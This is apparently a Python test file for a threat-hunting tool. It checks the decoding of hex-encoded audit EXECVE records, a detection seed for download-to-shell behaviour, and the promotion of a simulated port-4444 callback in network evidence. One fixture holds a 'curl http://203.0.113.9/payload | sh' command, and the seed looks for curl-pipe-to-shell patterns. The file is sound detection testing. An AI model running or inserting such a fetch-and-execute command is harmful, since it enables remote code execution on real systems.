import json
import tempfile
import unittest
from dataclasses import replace
from pathlib import Path


class AuditNormalizationTests(unittest.TestCase):
    def test_hex_encoded_execve_arguments_become_structured_command_fields(self):
        from romulus.intelligence.normalization import normalize_elasticsearch_event

        command = "curl http://203.0.113.9/payload | sh"
        hit = {
            "message": (
                'type=EXECVE msg=audit(1731942292.100:42): argc=3 '
                'a0="/bin/sh" a1="-c" a2=' + command.encode().hex()
            )
        }

        normalized = normalize_elasticsearch_event(hit)

        self.assertEqual(normalized["process.args"], ["/bin/sh", "-c", command])
        self.assertEqual(normalized["process.command_line"], f"/bin/sh -c {command}")
        self.assertEqual(normalized["process.name"], "sh")
        self.assertEqual(normalized["process.executable"], "/bin/sh")
        self.assertEqual(normalized["message"], hit["message"])

    def test_invalid_hex_and_non_execve_messages_are_not_misdecoded(self):
        from romulus.intelligence.normalization import normalize_elasticsearch_event

        invalid = normalize_elasticsearch_event({
            "message": 'type=EXECVE msg=audit(1.0:2): argc=2 a0="tool" a1=zz11'
        })
        ordinary = normalize_elasticsearch_event({"message": "health check a0=6375726c"})

        self.assertEqual(invalid["process.args"], ["tool", "zz11"])
        self.assertEqual(invalid["process.command_line"], "tool zz11")
        self.assertNotIn("process.command_line", ordinary)


class BehaviorSeedPrecisionTests(unittest.TestCase):
    def test_download_to_shell_seed_requires_both_behaviors_and_queries_audit_hex(self):
        from romulus.intelligence.behavior_catalog import (
            compile_elasticsearch_seed,
            load_behavior_catalog,
        )

        analytic = next(
            item for item in load_behavior_catalog()["analytics"]
            if item["id"] == "BH-LNX-003"
        )
        query = compile_elasticsearch_seed(
            analytic,
            {"process.command_line": ["message", "event.original", "process.command_line"]},
            "@timestamp",
            {"gte": "2024-11-18T10:00:00Z", "lte": "2024-11-18T17:00:00Z"},
        )

        self.assertEqual(len(analytic["match"]["all"]), 2)
        self.assertEqual(len(query["bool"]["must"]), 2)
        encoded = json.dumps(query, sort_keys=True).lower()
        self.assertIn("curl", encoded)
        self.assertIn("| sh", encoded)
        self.assertIn("6375726c", encoded)


class CompleteEvidenceAnalysisTests(unittest.TestCase):
    def test_analysis_uses_persisted_evidence_and_promotes_candidate_context(self):
        from romulus.config import Settings
        from romulus.investigation.workflow import HuntEngine
        from romulus.models import Evidence, encode
        from romulus.store import Store

        with tempfile.TemporaryDirectory(dir=Path(__file__).resolve().parent) as directory:
            root = Path(directory)
            settings = replace(
                Settings.from_env(),
                home=root,
                data_dir=root / "data",
                logs_dir=root / "logs",
                reports_dir=root / "reports",
                context_evidence_per_source=2,
            )
            store = Store(settings.data_dir, settings.logs_dir)
            engine = HuntEngine(settings, store, offline=True, use_ollama=False)
            state = {
                "hunt_id": "HUNT-COMPLETE-EVIDENCE",
                "objective": "general hunt",
                "host": [],
                "network": [],
                "evidence": [],
                "hypotheses": [],
                "findings": [],
                "correlations": [],
                "coverage": {},
                "candidate_leads": [],
                "lead_catalog": [],
                "completed_leads": [],
                "pivot_results": [],
                "queries": [],
                "tool_runs": [],
                "stage_history": [],
                "source_errors": [],
                "search_tasks": {},
                "search_outcomes": [],
                "evidence_keys": [],
                "source_health": {"host": True, "network": True},
            }

            def add_network(number, source, destination, port, when):
                item = encode(Evidence.create(
                    "arkime",
                    f"{source} connected to {destination}:{port}",
                    observed_at=when,
                    asset=destination,
                    provenance={"session_id": f"session-{number}", "domain": "network"},
                    raw={"source.ip": source, "destination.ip": destination,
                         "destination.port": port, "network.protocol": "tcp"},
                ))
                compact = engine._record_evidence(state, item)
                if compact:
                    state["network"].append(compact)
                return item["evidence_id"]

            add_network(1, "10.0.0.1", "10.0.0.2", 443, "2026-10-14T14:00:00Z")
            add_network(2, "10.0.0.2", "10.0.0.3", 443, "2026-10-14T14:00:01Z")
            for offset, port in enumerate(range(20, 28), start=3):
                add_network(offset, "203.0.113.9", "10.0.0.5", port,
                            f"2026-10-14T14:10:{offset:02d}Z")
            callback_id = add_network(
                11, "10.0.0.5", "203.0.113.9", 4444, "2026-10-14T14:11:00Z"
            )

            self.assertEqual(len(state["network"]), 2)
            result = engine._analyze(state)

            lead = next(item for item in result["candidate_leads"]
                        if item["analytic_id"] == "BH-NET-001")
            self.assertGreaterEqual(lead["priority_score"], 40)
            self.assertEqual(result["coverage"]["analysis_evidence"]["persisted"], 11)
            self.assertEqual(result["coverage"]["analysis_evidence"]["network"], 11)
            promoted_ids = {item["evidence_id"] for item in result["network"]}
            self.assertTrue(set(lead["evidence_ids"]) <= promoted_ids)
            self.assertIn(callback_id, promoted_ids)
            self.assertLessEqual(result["coverage"]["analysis_evidence"]["promoted"], 200)


if __name__ == "__main__":
    unittest.main()
